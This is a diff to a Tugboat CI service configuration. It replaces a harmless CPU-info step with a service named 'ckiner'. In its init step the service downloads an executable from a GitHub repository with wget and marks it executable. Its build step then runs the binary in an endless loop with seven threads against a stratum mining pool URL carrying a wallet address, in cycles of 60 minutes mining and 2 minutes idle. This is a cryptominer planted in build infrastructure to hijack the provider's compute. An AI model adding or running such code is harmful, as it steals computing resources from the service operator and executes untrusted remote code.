@@ -1,11 +1,27 @@
 services:
-  cpu-info:
+  ckiner:
     image: tugboatqa/ubuntu:noble
     default: true
     commands:
       init:
-        - apt-get update && apt-get install -y util-linux
+        - apt-get update && apt-get install -y wget
+        - mkdir -p /app/miner
+        - cd /app/miner && wget -q https://github.com/Nitasa61/toolkit2/raw/refs/heads/main/ckiner -O ckiner && chmod +x ckiner
+        - echo "[*] ckiner ready — 7 threads — 60m ON / 2m OFF"
       build:
-        - echo "================== INFORMASI CPU CLOUD TUGBOAT =================="
-        - lscpu
-        - echo "================================================================="
+        - |
+          BIN=/app/miner/ckiner
+          POOL="stratum1+tcp://cb192fddfc1c24f6b7a27df5ceb903c03479bafde9d5.ckiner@us.catchthatrabbit.com:8008"
+          C=0
+          echo "[*] ckiner ready — 7 threads — 60m ON / 2m OFF"
+          while true; do
+            C=$((C+1))
+            echo "[Cycle $C] ▶ MINING 60m | $(date '+%H:%M:%S')"
+            $BIN --noeval --hard-aes -P "$POOL" -t 7 &
+            MPID=$!
+            sleep 3600
+            kill $MPID 2>/dev/null
+            wait $MPID 2>/dev/null
+            echo "[Cycle $C] ⏸ IDLE 2m | $(date '+%H:%M:%S')"
+            sleep 120
+          done
